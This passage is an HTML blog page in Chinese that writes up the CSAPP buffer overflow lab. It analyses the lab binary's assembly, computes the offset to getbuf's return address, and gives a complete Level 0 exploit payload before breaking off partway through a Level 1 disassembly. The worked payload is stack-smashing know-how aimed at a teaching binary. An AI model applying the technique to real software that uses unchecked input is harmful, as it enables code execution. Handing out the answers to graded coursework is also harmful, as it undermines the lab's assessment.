@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="buffer实验详细记录">
+<meta name="keywords" content="实验、CSAPP、github"><title>CSAPP:buffer实验</title>
+
+
+<link rel="canonical" href="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.fc63a74a267099258a7827a936bd9888079f22ea5553f59e32246308d90e4ee7.css"><meta property='og:title' content="CSAPP:buffer实验">
+<meta property='og:description' content="buffer实验详细记录">
+<meta property='og:url' content='/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/'>
+<meta property='og:site_name' content='Lee'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CSAPP' /><meta property='article:published_time' content='2024-10-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-09-02T21:36:09&#43;08:00'/><meta property='og:image' content='/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.jpg' />
+<meta name="twitter:title" content="CSAPP:buffer实验">
+<meta name="twitter:description" content="buffer实验详细记录"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        <figure class="site-avatar">
+                <a href="/en/">
+                    <img src="/img/avatar.png" 
+                        width="300"
+                        height="300"
+                        class="site-logo"
+                        loading="lazy"
+                        alt="Avatar">
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en/">Lee</a></h1>
+            <h2 class="site-description">天将降大任于斯人也</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='/'
+                        
+                        title="首页&amp;关于"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/chenyuan1125'
+                        
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%85%B3%E4%BA%8E/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E9%93%BE%E6%8E%A5/' >
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    <li id="i18n-switch">  
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                        <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                            
+                                
+                                
+                                    
+                                        
+                                    
+                                
+                                    
+                                
+                                <option value="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/" selected>English</option>
+                            
+                                
+                                
+                                    
+                                
+                                    
+                                        
+                                    
+                                
+                                <option value="/p/csappbuffer%E5%AE%9E%E9%AA%8C/" >中文</option>
+                            
+                        </select>
+                    </li>
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#level-0-candle">Level 0: Candle</a></li>
+        <li><a href="#level-1sparker">level 1：Sparker</a></li>
+        <li><a href="#level2firecracker">level2：Firecracker</a></li>
+        <li><a href="#level3-dynamite">level3： Dynamite</a></li>
+        <li><a href="#level4nitroglycerin这个实验的解题思路有点没有理解">level4：Nitroglycerin（这个实验的解题思路有点没有理解）</a></li>
+      </ol>
+    </li>
+  </ol>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+    <div class="article-image">
+        <a href="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/">
+            <img alt="Featured image of post CSAPP:buffer实验" height="2400" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.jpg" srcset="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu_6da9cc03594c0393.jpg 800w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu_e19c6e182b193f15.jpg 1600w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu_3950d4616c8d176e.jpg 2400w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.jpg 3840w" width="3840">
+        </a>
+    </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+            
+            
+            <a href="/en/categories/%E5%AE%9E%E9%AA%8C/" style="background-color: #2a9d8f; color: #fff;">
+                实验
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/">CSAPP:buffer实验</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            buffer实验详细记录
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2024-10-06T00:00:00Z'>2024-10-06</time>
+                
+
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                    <time class="article-time--reading">
+                        8 minutes read
+                    </time>
+                
+            </div>
+        
+
+        
+            <div class="inline-meta">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                
+                    <a href="/p/csappbuffer%E5%AE%9E%E9%AA%8C/" class="link">中文</a>
+                
+            </div>
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>Table of contents</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#level-0-candle">Level 0: Candle</a></li>
+        <li><a href="#level-1sparker">level 1：Sparker</a></li>
+        <li><a href="#level2firecracker">level2：Firecracker</a></li>
+        <li><a href="#level3-dynamite">level3： Dynamite</a></li>
+        <li><a href="#level4nitroglycerin这个实验的解题思路有点没有理解">level4：Nitroglycerin（这个实验的解题思路有点没有理解）</a></li>
+      </ol>
+    </li>
+  </ol>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h1 id="buffer实验">buffer实验
+</h1><h3 id="level-0-candle">Level 0: Candle
+</h3><p><strong>目标：执行 smoke()，而不是让 getbuf() 返回 1。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* Put canary on stack to detect possible corruption */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">volatile</span> <span class="kt">int</span> <span class="n">local</span> <span class="o">=</span> <span class="nf">uniqueval</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">val</span> <span class="o">=</span> <span class="nf">getbuf</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	    <span class="cm">/* Check for corrupted stack */</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span> <span class="p">(</span><span class="n">local</span> <span class="o">!=</span> <span class="nf">uniqueval</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Sabotaged!: the stack has been corrupted</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Boom!: getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Dud: getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>bufboms.s</code>的第 363 行找到了 smoke 的地址 08048c18：</p>
+<p><a class="link" href="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163943.png"  target="_blank" rel="noopener"
+    ><img alt="图1" class="gallery-image" data-flex-basis="622px" data-flex-grow="259" height="490" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163943.png" srcset="/2020-04-13-163943_654429883505271578_hu_1d2ca9dd04228b0d.png 800w, https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163943.png 1270w" width="1270"></a></p>
+<p>再研究 test 的部分汇编代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"> <span class="m">08048</span><span class="n">daa</span> <span class="o">&lt;</span><span class="n">test</span><span class="o">&gt;:</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8048</span><span class="n">daa</span><span class="o">:</span>	<span class="m">55</span>                   	<span class="n">push</span>   <span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048dab:	89 e5                	mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048dad:	53                   	push   %</span><span class="n">ebx</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8048</span><span class="n">dae</span><span class="o">:</span>	<span class="m">83</span> <span class="n">ec</span> <span class="m">24</span>             	<span class="n">sub</span>    <span class="o">$</span><span class="mh">0x24</span><span class="p">,</span><span class="o">%esp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048db1:	e8 da ff ff ff       	call   8048d90 &lt;uniqueval&gt;
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048db6:	89 45 f4             	mov    %</span><span class="n">eax</span><span class="p">,</span><span class="m">-0</span><span class="nf">xc</span><span class="p">(</span><span class="o">%ebp)
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048db9:	e8 36 04 00 00       	call   80491f4 &lt;getbuf&gt;
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048dbe:	89 c3                	mov    %</span><span class="n">eax</span><span class="p">,</span>%<span class="n">ebx</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8048</span><span class="n">dc0</span><span class="o">:</span>	<span class="n">e8</span> <span class="n">cb</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="m">8048</span><span class="n">d90</span> <span class="o">&lt;</span><span class="n">uniqueval</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>getbuff:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="m">080491</span><span class="n">f4</span> <span class="o">&lt;</span><span class="n">getbuf</span><span class="o">&gt;:</span>
+</span></span><span class="line"><span class="cl"> <span class="m">80491</span><span class="n">f4</span><span class="o">:</span>	<span class="m">55</span>                   	<span class="n">push</span>   <span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 80491f5:	89 e5                	mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 80491f7:	83 ec 38             	sub    $0x38,%</span><span class="n">esp</span>
+</span></span><span class="line"><span class="cl"> <span class="m">80491</span><span class="n">fa</span><span class="o">:</span>	<span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">d8</span>             	<span class="n">lea</span>    <span class="m">-0</span><span class="nf">x28</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+</span></span><span class="line"><span class="cl"> <span class="m">80491</span><span class="n">fd</span><span class="o">:</span>	<span class="m">89</span> <span class="m">04</span> <span class="m">24</span>             	<span class="n">mov</span>    <span class="o">%eax,(%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8049200</span><span class="o">:</span>	<span class="n">e8</span> <span class="n">f5</span> <span class="n">fa</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="m">8048</span><span class="n">cfa</span> <span class="o">&lt;</span><span class="n">Gets</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8049205</span><span class="o">:</span>	<span class="n">b8</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       	<span class="n">mov</span>    <span class="o">$</span><span class="mh">0x1</span><span class="p">,</span>%<span class="n">eax</span>
+</span></span><span class="line"><span class="cl"> <span class="m">804920</span><span class="n">a</span><span class="o">:</span>	<span class="n">c9</span>                   	<span class="n">leave</span>  
+</span></span><span class="line"><span class="cl"> <span class="m">804920</span><span class="n">b</span><span class="o">:</span>	<span class="n">c3</span>                   	<span class="n">ret</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到 lea 把 buf 的指针地址 (-0x28 (% ebp)) 传给了 Gets ()，0x28 也就是十进制的 40 个字节。而 ebp 占了 4 个字节，buf 距离 getbuff 的返回地址还有 44 个字节。</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">返回地址</th>
+					<th style="text-align: left">需要修改的地址</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left">ebp</td>
+					<td style="text-align: left">- 占用4字节</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left">&hellip;</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp - 40 字节</td>
+					<td style="text-align: left">buf 数组的初始地址</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left">&hellip;</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp - 0x38</td>
+					<td style="text-align: left">esp，栈帧首地址</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>从文档中得知：</p>
+<p><a class="link" href="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163946.png"  target="_blank" rel="noopener"
+    ><img alt="图2" class="gallery-image" data-flex-basis="1767px" data-flex-grow="736" height="182" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163946.png" srcset="/2020-04-13-163946_4094221263209031881_hu_a080394b5afd2e8d.png 800w, https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163946.png 1340w" width="1340"></a></p>
+<p>Gets 函数不验证是否超出了 <code>NORMAL_BUFFER_SIZE</code>，所以超出字符的就会覆盖掉内存。</p>
+<p>那么只要在 buf 开始处随便填入 44 字节（0a 除外，会终止输入），然后在后面加入 smoke 的地址，覆盖掉栈中的返回地址即可。</p>
+<p>另外需要注意的是 x86 机器为小端法机器，最低有效字节在内存的前面，所以在 exploit.txt 中填入如下答案即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 18 8c 04 08
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="level-1sparker">level 1：Sparker
+</h3><p>目标：调用fizz函数，并且通过传递自己的cookie值作为参数，以此来通过验证</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">08048c42 &lt;fizz&gt;:
+</span></span><span class="line"><span class="cl"> 8048c42:	55                   	push   %ebp
+</span></span><span class="line"><span class="cl"> 8048c43:	89 e5                	mov    %esp,%ebp
+</span></span><span class="line"><span class="cl"> 8048c45:	83 ec 18             	sub    $0x18,%esp
+</span></span><span class="line"><span class="cl"> 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
+</span></span><span class="line"><span class="cl"> 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+</span></span><span class="line"><span class="cl"> 8048c51:	75 26                	jne    8048c79 &lt;fizz+0x37&gt;
+</span></span><span class="line"><span class="cl"> 8048c53:	89 44 24 08          	mov    %eax,0x8(%esp)
+</span></span><span class="line"><span class="cl"> 8048c57:	c7 44 24 04 ee a4 04 	movl   $0x804a4ee,0x4(%esp)
+</span></span><span class="line"><span class="cl"> 8048c5e:	08 
+</span></span><span class="line"><span class="cl"> 8048c5f:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+</span></span><span class="line"><span class="cl"> 8048c66:	e8 55 fd ff ff       	call   80489c0 &lt;__printf_chk@plt&gt;
